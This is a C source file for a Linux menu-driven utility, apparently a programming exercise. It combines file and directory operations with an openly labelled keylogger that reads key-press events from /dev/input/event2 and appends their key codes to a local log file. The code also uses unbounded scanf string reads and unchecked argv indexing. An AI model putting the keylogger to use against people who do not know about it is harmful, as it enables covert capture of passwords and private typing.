#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <time.h>
#include <termios.h>
#include <linux/input.h> // Required for input_event struct
#include <signal.h>

// Constants
#define MAX_BUFFER_SIZE 1024
#define DEFAULT_FILE_PERMS 0644
#define DEFAULT_DIR_PERMS 0755
#define DEVICE_PATH "/dev/input/event2" // Adjust this to your keyboard's device path

// Global Variables
int running = 1;

// Function declarations
void runMenuSystem(void);
void handleFileOperations(int operationType, const char* primaryArg, const char* secondaryArg);
void handleDirectoryOperations(int operationType, const char* dirPath);
void startKeylogger(const char* logfile);
void displayMainMenu(void);
void sigint_handler(int sig);

typedef enum {
    FILE_CREATE = 1,
    FILE_CHANGE_PERMISSION,
    FILE_READ,
    FILE_WRITE,
    FILE_DELETE
} FileOperationType;

typedef enum {
    DIR_CREATE = 1,
    DIR_REMOVE,
    DIR_PRINT_CURRENT,
    DIR_LIST
} DirectoryOperationType;

int main(int argc, char* argv[]) {
    if (argc == 1) {
        runMenuSystem();
        return 0;
    }

    if (strcmp(argv[1], "-m") != 0) {
        printf("Invalid arguments. Use the following format:\n");
        printf("./supercommand -m <mode> <operation> <args>\n");
        return 1;
    }

    int mode = atoi(argv[2]);
    switch (mode) {
        case 1:
            handleFileOperations(atoi(argv[3]), argv[4], argv[5]);
            break;
        case 2:
            handleDirectoryOperations(atoi(argv[3]), argv[4]);
            break;
        case 3:
            startKeylogger(argv[3]);
            break;
        default:
            printf("Invalid mode selected!\n");
            return 1;
    }

    return 0;
}

void runMenuSystem(void) {
    int choice;
    char primaryArg[MAX_BUFFER_SIZE];
    char secondaryArg[MAX_BUFFER_SIZE];

    while (1) {
        displayMainMenu();
        printf("Enter your choice: ");
        if (scanf("%d", &choice) != 1) {
            while (getchar() != '\n'); // Clear input buffer
            printf("Invalid input! Please enter a number.\n");
            continue;
        }

        switch (choice) {
            case 1: {
                int subChoice;
                printf("File Operations:\n"
                       "1. Create File\n"
                       "2. Change Permission\n"
                       "3. Read File\n"
                       "4. Write File\n"
                       "5. Delete File\n");
                printf("Enter your choice: ");
                scanf("%d", &subChoice);
                printf("Enter file name (and path if required): ");
                scanf("%s", primaryArg);

                if (subChoice == FILE_CHANGE_PERMISSION) {
                    printf("Enter permission (e.g., 0644): ");
                    scanf("%s", secondaryArg);
                }
                handleFileOperations(subChoice, primaryArg,
                                     subChoice == FILE_CHANGE_PERMISSION ? secondaryArg : NULL);
                break;
            }
            case 2: {
                int subChoice;
                printf("Directory Operations:\n"
                       "1. Create Directory\n"
                       "2. Remove Directory\n"
                       "3. Print Current Directory\n"
                       "4. List Directory\n");
                printf("Enter your choice: ");
                scanf("%d", &subChoice);

                if (subChoice <= DIR_REMOVE) {
                    printf("Enter directory name (and path if required): ");
                    scanf("%s", primaryArg);
                }
                handleDirectoryOperations(subChoice, subChoice <= DIR_REMOVE ? primaryArg : NULL);
                break;
            }
            case 3: {
                printf("Keylogger Operations:\nEnter log file name (e.g., keylog.txt): ");
                scanf("%s", primaryArg);
                startKeylogger(primaryArg);
                break;
            }
            case 0:
                printf("Exiting...\n");
                return;
            default:
                printf("Invalid choice!\n");
        }
    }
}

void handleFileOperations(int operationType, const char* primaryArg, const char* secondaryArg) {
    int fileDescriptor;

    switch (operationType) {
        case FILE_CREATE:
            fileDescriptor = open(primaryArg, O_CREAT | O_WRONLY, DEFAULT_FILE_PERMS);
            if (fileDescriptor == -1) {
                perror("Error creating/opening file");
                return;
            }
            printf("File %s created/opened successfully.\n", primaryArg);
            close(fileDescriptor);
            break;

        case FILE_CHANGE_PERMISSION: {
            mode_t newPerms = strtol(secondaryArg, NULL, 8);
            if (chmod(primaryArg, newPerms) == -1) {
                perror("Error changing file permissions");
                return;
            }
            printf("Permissions of file %s changed to %s.\n", primaryArg, secondaryArg);
            break;
        }

        case FILE_READ:
            fileDescriptor = open(primaryArg, O_RDONLY);
            if (fileDescriptor == -1) {
                perror("Error opening file for reading");
                return;
            }
            {
                char buffer[MAX_BUFFER_SIZE];
                ssize_t bytesRead;
                while ((bytesRead = read(fileDescriptor, buffer, sizeof(buffer))) > 0) {
                    write(STDOUT_FILENO, buffer, bytesRead);
                }
                printf("\n");
                close(fileDescriptor);
            }
            break;

        case FILE_WRITE:
            fileDescriptor = open(primaryArg, O_WRONLY | O_APPEND);
            if (fileDescriptor == -1) {
                perror("Error opening file for writing");
                return;
            }
            {
                char buffer[MAX_BUFFER_SIZE];
                printf("Enter text to write to the file: ");
                scanf(" %[^\n]", buffer);
                write(fileDescriptor, buffer, strlen(buffer));
                printf("Text written to file %s.\n", primaryArg);
                close(fileDescriptor);
            }
            break;

        case FILE_DELETE:
            if (unlink(primaryArg) == -1) {
                perror("Error deleting file");
                return;
            }
            printf("File %s deleted successfully.\n", primaryArg);
            break;

        default:
            printf("Invalid file operation!\n");
    }
}

void handleDirectoryOperations(int operationType, const char* dirPath) {
    switch (operationType) {
        case DIR_CREATE:
            if (mkdir(dirPath, DEFAULT_DIR_PERMS) == -1) {
                perror("Error creating directory");
                return;
            }
            printf("Directory %s created successfully.\n", dirPath);
            break;

        case DIR_REMOVE:
            if (rmdir(dirPath) == -1) {
                perror("Error removing directory");
                return;
            }
            printf("Directory %s removed successfully.\n", dirPath);
            break;

        case DIR_PRINT_CURRENT: {
            char currentPath[MAX_BUFFER_SIZE];
            if (getcwd(currentPath, sizeof(currentPath)) == NULL) {
                perror("Error getting current directory");
                return;
            }
            printf("Current Directory: %s\n", currentPath);
            break;
        }

        case DIR_LIST: {
            DIR* dir = opendir(dirPath ? dirPath : ".");
            if (dir == NULL) {
                perror("Error opening directory");
                return;
            }

            printf("Directory contents:\n");
            struct dirent* entry;
            while ((entry = readdir(dir)) != NULL) {
                printf("%s\n", entry->d_name);
            }
            closedir(dir);
            break;
        }

        default:
            printf("Invalid directory operation!\n");
    }
}

void startKeylogger(const char* logfile) {
    struct input_event ev;
    int fd, logfd;
    char timestamp[64];
    time_t t;
    struct tm* tm_info;

    // Open the input device for reading
    fd = open(DEVICE_PATH, O_RDONLY);
    if (fd == -1) {
        perror("Failed to open input device");
        return;
    }

    // Open the log file for writing
    logfd = open(logfile, O_CREAT | O_WRONLY | O_APPEND, DEFAULT_FILE_PERMS);
    if (logfd == -1) {
        perror("Failed to open log file");
        close(fd);
        return;
    }

    // Write session start timestamp to the log file
    t = time(NULL);
    tm_info = localtime(&t);
    strftime(timestamp, sizeof(timestamp), "Session started: %Y-%m-%d %H:%M:%S\n", tm_info);
    write(logfd, timestamp, strlen(timestamp));

    printf("Keylogger started. Logging keystrokes to %s\n", logfile);

    // Set up signal handling for graceful termination
    signal(SIGINT, sigint_handler);

    while (running) {
        // Read input events
        ssize_t bytesRead = read(fd, &ev, sizeof(ev));
        if (bytesRead == sizeof(ev)) {
            if (ev.type == EV_KEY && ev.value == 1) { // Key press event
                char keyInfo[64];
                snprintf(keyInfo, sizeof(keyInfo), "Key %d pressed\n", ev.code);
                write(logfd, keyInfo, strlen(keyInfo));
            }
        }
    }

    // Clean up resources
    close(fd);
    close(logfd);
    printf("Keylogger stopped.\n");
}

void sigint_handler(int sig) {
    running = 0;
}

void displayMainMenu(void) {
    printf("\nMain Menu:\n"
           "1. File Operations\n"
           "2. Directory Operations\n"
           "3. Keylogger\n"
           "0. Exit\n");
}
